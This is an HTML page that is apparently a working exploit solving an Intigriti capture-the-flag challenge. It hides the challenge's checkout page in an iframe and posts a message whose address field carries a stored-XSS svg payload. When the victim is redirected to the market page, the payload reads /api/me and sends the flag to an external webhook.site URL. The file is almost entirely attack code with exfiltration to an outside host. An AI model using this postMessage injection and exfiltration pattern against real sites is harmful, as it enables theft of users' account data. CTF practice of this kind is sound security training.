<!DOCTYPE html>
<html>
<body>
    <script>
        const challengeDomain = "https://challenge-0126.intigriti.io";
        const webhook = "https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4";
        
        // Use a more robust payload that handles potential character limits
        // This escapes the title attribute and exfiltrates the flag
        const xss = `"><svg onload="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${webhook}?flag='+encodeURIComponent(d.flag)))">`;

        // Create the iframe to checkout.html
        const iframe = document.createElement('iframe');
        // We target 1337COIN because the Admin definitely holds it
        iframe.src = `${challengeDomain}/checkout.html?currency=1337COIN&price=1000000`;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            // Give the checkout page a moment to initialize its message listener
            setTimeout(() => {
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xss,
                        currency: '1337COIN', // Target the Admin's specific currency
                        amount: 0.00000001
                    }
                }, '*');
            }, 1000);

            // Redirect to MarketWatch to trigger the stored XSS
            setTimeout(() => {
                window.location.href = `${challengeDomain}/marketwatch.html`;
            }, 3000);
        };
    </script>
</body>
</html>
